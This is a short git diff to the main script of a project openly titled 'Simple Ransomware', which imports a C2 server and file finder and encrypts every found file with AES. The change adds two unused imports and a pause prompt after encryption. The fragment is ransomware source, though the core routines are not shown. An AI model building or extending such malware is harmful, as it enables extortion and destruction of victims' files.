@@ -1,6 +1,8 @@
 # Simple Ransomware - Shinji Mimura
 
 # Import Classes
+from operator import truediv
+from tracemalloc import stop
 from crypto.main import CryptClass
 from server.main import C2Server
 from utils.filefinder import FileFinder
@@ -25,6 +27,12 @@ if __name__ == "__main__":
 
     for f in filefinder.file_paths:
         cryptclass.encrypt(f, aes)
+
+    stopkey = True
+    while stopkey:
+        op = int(input(("[STOPPED] Press 1 to continue: ")))
+        if op == 1:
+            stopkey = False
 
     aes = pyaes.AESModeOfOperationCTR(cryptclass.key)
 
